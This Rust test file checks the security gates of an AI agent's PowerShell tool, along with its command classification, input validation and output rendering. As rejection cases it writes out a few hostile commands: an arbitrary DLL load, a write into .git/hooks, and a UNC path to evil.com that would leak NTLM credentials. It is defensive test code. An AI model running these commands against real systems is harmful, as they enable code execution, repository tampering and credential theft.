//! Tests for PowerShellTool's R5-T9 security pipeline integration.
//!
//! These tests verify that the execute path actually runs the gate
//! helpers from `powershell.rs` — previously they were dead code.

use super::PowerShellTool;
use coco_tool_runtime::BackgroundShellKind;
use coco_tool_runtime::BackgroundShellRequest;
use coco_tool_runtime::DynTool;
use coco_tool_runtime::TaskHandle;
use coco_tool_runtime::ToolUseContext;
use serde_json::json;
use std::collections::HashMap;
use std::path::Path;
use std::path::PathBuf;
use std::sync::Arc;
use std::sync::Mutex;

/// Mirror BashTool: `run_in_background` is dropped from the model-facing
/// schema when background tasks are disabled, so the model never sets a field
/// whose background execution path would then fail for lack of a task handle.
#[tokio::test]
async fn test_powershell_tool_spec_drops_run_in_background_when_disabled() {
    async fn ps_params(ctx: &coco_tool_runtime::SchemaContext) -> serde_json::Value {
        match <PowerShellTool as DynTool>::tool_spec(
            &PowerShellTool,
            ctx,
            &coco_tool_runtime::PromptOptions::default(),
        )
        .await
        {
            coco_tool_runtime::ToolSpec::Function(spec) => spec.parameters,
            coco_tool_runtime::ToolSpec::Freeform(_) => {
                panic!("PowerShellTool must be a Function tool")
            }
        }
    }

    // Default session: run_in_background exposed.
    let default_params = ps_params(&coco_tool_runtime::SchemaContext::default()).await;
    assert!(
        default_params["properties"]
            .as_object()
            .expect("schema has properties")
            .contains_key("run_in_background"),
        "default session must expose run_in_background"
    );

    // Background tasks disabled: run_in_background omitted.
    let ctx = coco_tool_runtime::SchemaContext {
        background_tasks_disabled: true,
        ..Default::default()
    };
    let disabled_params = ps_params(&ctx).await;
    assert!(
        !disabled_params["properties"]
            .as_object()
            .expect("schema has properties")
            .contains_key("run_in_background"),
        "background_tasks_disabled session must omit run_in_background"
    );
}

/// Unsafe CLM type reference must be blocked before pwsh is spawned.
/// Rejects types outside the allowlist.
#[tokio::test]
async fn test_powershell_rejects_unsafe_clm_type() {
    let ctx = ToolUseContext::test_default();
    let result = <PowerShellTool as DynTool>::execute(
        &PowerShellTool,
        json!({"command": "[System.Reflection.Assembly]::LoadFrom('x.dll')"}),
        &ctx,
    )
    .await;
    assert!(result.is_err(), "unsafe .NET type must be rejected");
    let err = result.unwrap_err().to_string();
    assert!(
        err.contains("allowlist") || err.contains("security"),
        "error should mention CLM allowlist: {err}"
    );
}

/// Writing to `.git/hooks/...` via a destructive cmdlet must be blocked.
#[tokio::test]
async fn test_powershell_rejects_git_internal_write() {
    let ctx = ToolUseContext::test_default();
    let result = <PowerShellTool as DynTool>::execute(
        &PowerShellTool,
        json!({"command": "Set-Content .git/hooks/pre-commit 'evil'"}),
        &ctx,
    )
    .await;
    assert!(result.is_err(), "git-internal write must be rejected");
}

/// UNC paths in command arguments must be blocked (NTLM credential leak).
#[tokio::test]
async fn test_powershell_rejects_unc_path() {
    let ctx = ToolUseContext::test_default();
    let result = <PowerShellTool as DynTool>::execute(
        &PowerShellTool,
        json!({"command": "Get-ChildItem \\\\evil.com\\share"}),
        &ctx,
    )
    .await;
    assert!(result.is_err(), "UNC path must be rejected");
    let err = result.unwrap_err().to_string();
    assert!(
        err.contains("UNC") || err.contains("credential"),
        "error should mention UNC/credential: {err}"
    );
}

/// Read-only commands (Get-Process, Get-ChildItem, etc.) must be
/// classified as `is_read_only == true` so the executor can batch them
/// with other safe tools. Matches Bash's read-only fast path.
#[test]
fn test_powershell_read_only_fast_path() {
    let cases = [
        "Get-Process",
        "Get-ChildItem",
        "Get-Content x.txt",
        "Select-String -Pattern foo file.txt",
    ];
    for cmd in cases {
        let input = json!({"command": cmd});
        assert!(
            <PowerShellTool as DynTool>::is_read_only(&PowerShellTool, &input),
            "`{cmd}` should be read-only"
        );
        assert!(
            <PowerShellTool as DynTool>::is_concurrency_safe(&PowerShellTool, &input),
            "`{cmd}` should be concurrency-safe"
        );
        assert!(
            !<PowerShellTool as DynTool>::is_destructive(&PowerShellTool, &input),
            "`{cmd}` should not be destructive"
        );
    }
}

/// Destructive cmdlets (Set-Content, Remove-Item, Invoke-WebRequest) must
/// be classified as destructive so they route through the permission
/// prompt upstream.
#[test]
fn test_powershell_destructive_classification() {
    let cases = [
        "Set-Content foo.txt bar",
        "Remove-Item -Recurse -Force foo",
        "New-Item -ItemType File bar",
    ];
    for cmd in cases {
        let input = json!({"command": cmd});
        assert!(
            !<PowerShellTool as DynTool>::is_read_only(&PowerShellTool, &input),
            "`{cmd}` should not be read-only"
        );
        assert!(
            <PowerShellTool as DynTool>::is_destructive(&PowerShellTool, &input),
            "`{cmd}` should be destructive"
        );
    }
}

/// `maxResultSizeChars` is set to `30_000`.
#[test]
fn test_powershell_max_result_size_matches_ts() {
    assert_eq!(
        <PowerShellTool as DynTool>::max_result_size_bound(&PowerShellTool,),
        coco_tool_runtime::ResultSizeBound::Chars(30_000),
    );
}

/// Missing `command` fails validation before execute runs.
#[test]
fn test_powershell_missing_command_fails_validation() {
    let ctx = ToolUseContext::test_default();
    let result = <PowerShellTool as DynTool>::validate_input(&PowerShellTool, &json!({}), &ctx);
    assert!(matches!(
        result,
        coco_tool_runtime::ValidationResult::Invalid { .. }
    ));
}

/// Timeouts above the 10-minute cap are rejected at validation time.
#[test]
fn test_powershell_timeout_max_enforced() {
    let ctx = ToolUseContext::test_default();
    let result = <PowerShellTool as DynTool>::validate_input(
        &PowerShellTool,
        &json!({"command": "Get-Process", "timeout": 700_000}),
        &ctx,
    );
    assert!(matches!(
        result,
        coco_tool_runtime::ValidationResult::Invalid { .. }
    ));
}

/// Read-only commands skip the CLM security gate — otherwise a harmless
/// `Get-Content x | Select-Object [*]` could trip the type pattern. The
/// gate only runs for destructive commands.
#[tokio::test]
async fn test_powershell_readonly_bypasses_clm_gate() {
    // `[int]` is allowed, but even if it weren't, the read-only fast path
    // should skip the gate. We choose `[System.Whatever]` (not allowed)
    // inside a Get- command to prove the gate is bypassed.
    let ctx = ToolUseContext::test_default();
    let result = <PowerShellTool as DynTool>::execute(
        &PowerShellTool,
        json!({"command": "Get-Content 'file.txt' # [System.Reflection.Assembly]"}),
        &ctx,
    )
    .await;
    // We expect this to either succeed (if pwsh is installed) or fail
    // with a pwsh-spawn error — NOT with a security-gate error.
    if let Err(e) = result {
        let msg = e.to_string();
        assert!(
            !msg.contains("allowlist") && !msg.contains("security"),
            "read-only command must bypass CLM gate, got: {msg}"
        );
    }
}

#[derive(Debug)]
struct FakePowerShellProvider {
    shell_type: coco_shell::ShellType,
    shell_path: PathBuf,
}

#[async_trait::async_trait]
impl coco_shell::ShellProvider for FakePowerShellProvider {
    fn shell_type(&self) -> &coco_shell::ShellType {
        &self.shell_type
    }

    fn shell_path(&self) -> &Path {
        &self.shell_path
    }

    async fn build_exec_command(
        &self,
        command: &str,
        _opts: &coco_shell::BuildExecOpts,
    ) -> coco_shell::BuiltCommand {
        coco_shell::BuiltCommand {
            command_string: command.to_string(),
            cwd_file_path: std::env::temp_dir().join("fake-powershell-cwd"),
        }
    }

    fn spawn_args(&self, command_string: &str) -> Vec<String> {
        vec![
            "-NoProfile".into(),
            "-NonInteractive".into(),
            "-Command".into(),
            command_string.into(),
        ]
    }

    async fn env_overrides(
        &self,
        _command: &str,
        _opts: &coco_shell::BuildExecOpts,
    ) -> HashMap<String, String> {
        HashMap::new()
    }
}

#[derive(Default)]
struct RecordingTaskHandle {
    request: Mutex<Option<BackgroundShellRequest>>,
}

#[async_trait::async_trait]
impl TaskHandle for RecordingTaskHandle {
    async fn spawn_shell_task(
        &self,
        request: BackgroundShellRequest,
    ) -> Result<String, coco_error::BoxedError> {
        *self.request.lock().unwrap() = Some(request);
        Ok("task-ps".into())
    }
}

#[tokio::test]
async fn test_powershell_background_preserves_command_for_provider() {
    let command = r#"$env:FOO = "$(Get-Date)"; Write-Output "quotes ' and `backtick`""#;
    let task_handle = Arc::new(RecordingTaskHandle::default());
    let provider = Arc::new(FakePowerShellProvider {
        shell_type: coco_shell::ShellType::PowerShell,
        shell_path: PathBuf::from("/fake/pwsh"),
    });
    let mut ctx = ToolUseContext::test_default();
    ctx.active_shell_tool = coco_types::ActiveShellTool::PowerShell;
    ctx.shell_provider = Some(provider);
    ctx.task_handle = Some(task_handle.clone());

    let result = <PowerShellTool as DynTool>::execute(
        &PowerShellTool,
        json!({
            "command": command,
            "run_in_background": true,
            "description": "pwsh bg"
        }),
        &ctx,
    )
    .await
    .expect("background PowerShell request should be accepted");
    assert_eq!(result.data["backgroundTaskId"], "task-ps");

    let request = task_handle
        .request
        .lock()
        .unwrap()
        .clone()
        .expect("task request captured");
    assert_eq!(request.command, command);
    assert!(!request.command.contains("-NoProfile"));
    assert!(matches!(
        request.shell_kind,
        BackgroundShellKind::Provider(ref provider)
            if matches!(provider.shell_type(), coco_shell::ShellType::PowerShell)
    ));
}

// ── render_for_model — output envelopes ────────────────

mod render_tests {
    use super::PowerShellTool;
    use coco_tool_runtime::DynTool;

    use coco_tool_runtime::ToolResultContentPart;
    use serde_json::json;

    fn text_of(parts: &[ToolResultContentPart]) -> &str {
        match &parts[0] {
            ToolResultContentPart::Text { text, .. } => text.as_str(),
            _ => panic!("expected Text part"),
        }
    }

    #[test]
    fn explicit_background_emits_task_id_and_output_path() {
        // Explicit `run_in_background: true` returns `{backgroundTaskId,
        // outputPath}` (no stdout) — the notice names both so the model can
        // `Read` the output file directly.
        let data = json!({
            "backgroundTaskId": "ps-1",
            "outputPath": "/cfg/cache/tasks/sess/ps-1.output",
        });
        let parts = <PowerShellTool as DynTool>::render_for_model(&PowerShellTool, &data);
        assert_eq!(
            text_of(&parts),
            "Command running in background with ID: ps-1. Output is being written to: /cfg/cache/tasks/sess/ps-1.output"
        );
    }

    #[test]
    fn foreground_joins_stdout_and_stderr() {
        let data = json!({
            "stdout": "hello\nworld",
            "stderr": "warn: x",
            "exitCode": 0,
            "interrupted": false,
        });
        let parts = <PowerShellTool as DynTool>::render_for_model(&PowerShellTool, &data);
        let text = text_of(&parts);
        assert!(text.contains("hello\nworld"), "got: {text}");
        assert!(text.contains("warn: x"), "got: {text}");
    }

    #[test]
    fn interrupted_appends_abort_marker() {
        // Interrupted runs append the
        // `<error>Command was aborted before completion</error>` marker
        // even when stderr is empty.
        let data = json!({
            "stdout": "partial",
            "stderr": "",
            "interrupted": true,
        });
        let parts = <PowerShellTool as DynTool>::render_for_model(&PowerShellTool, &data);
        let text = text_of(&parts);
        assert!(text.contains("partial"), "got: {text}");
        assert!(
            text.contains("<error>Command was aborted before completion</error>"),
            "got: {text}"
        );
    }

    #[test]
    fn persisted_output_path_is_ignored_by_renderer() {
        // Legacy persisted-output fields are not a model-visible
        // persistence source. The query-level generic Level 1
        // pipeline owns the `<persisted-output>` envelope.
        let data = json!({
            "stdout": "first line\nsecond line",
            "stderr": "",
            "interrupted": false,
            "persistedOutputPath": "/tmp/coco-ps-1.txt",
            "persistedOutputSize": 1_500_000,
        });
        let parts = <PowerShellTool as DynTool>::render_for_model(&PowerShellTool, &data);
        let text = text_of(&parts);
        assert!(text.contains("first line\nsecond line"), "got: {text}");
        assert!(!text.contains("<persisted-output>"), "got: {text}");
        assert!(!text.contains("/tmp/coco-ps-1.txt"), "got: {text}");
    }

    #[test]
    fn assistant_auto_backgrounded_emits_budget_message() {
        // Assistant-mode auto-promotion names the budget so the model
        // knows to delegate next time.
        let data = json!({
            "stdout": "",
            "stderr": "",
            "interrupted": false,
            "backgroundTaskId": "ps-99",
            "outputPath": "/cfg/cache/tasks/sess/ps-99.output",
            "assistantAutoBackgrounded": true,
        });
        let parts = <PowerShellTool as DynTool>::render_for_model(&PowerShellTool, &data);
        let text = text_of(&parts);
        assert!(
            text.contains("Command exceeded the assistant-mode blocking budget"),
            "got: {text}"
        );
        assert!(text.contains("ps-99"), "got: {text}");
        assert!(
            text.contains("Output is being written to: /cfg/cache/tasks/sess/ps-99.output"),
            "got: {text}"
        );
    }

    #[test]
    fn backgrounded_by_user_emits_manual_message() {
        // Ctrl+B-style manual move.
        let data = json!({
            "stdout": "",
            "stderr": "",
            "interrupted": false,
            "backgroundTaskId": "ps-7",
            "outputPath": "/cfg/cache/tasks/sess/ps-7.output",
            "backgroundedByUser": true,
        });
        let parts = <PowerShellTool as DynTool>::render_for_model(&PowerShellTool, &data);
        let text = text_of(&parts);
        assert!(
            text.contains(
                "Command was manually backgrounded by user with ID: ps-7. Output is being written to: /cfg/cache/tasks/sess/ps-7.output"
            ),
            "got: {text}"
        );
    }

    #[test]
    fn default_background_task_emits_short_message() {
        // Plain `run_in_background:true` path gets the short
        // "running in background" message.
        let data = json!({
            "stdout": "",
            "stderr": "",
            "interrupted": false,
            "backgroundTaskId": "ps-3",
            "outputPath": "/cfg/cache/tasks/sess/ps-3.output",
        });
        let parts = <PowerShellTool as DynTool>::render_for_model(&PowerShellTool, &data);
        let text = text_of(&parts);
        assert!(
            text.contains(
                "Command running in background with ID: ps-3. Output is being written to: /cfg/cache/tasks/sess/ps-3.output"
            ),
            "got: {text}"
        );
        assert!(
            !text.contains("assistant-mode"),
            "should not name budget: {text}"
        );
        assert!(!text.contains("manually"), "should not say manual: {text}");
    }
}
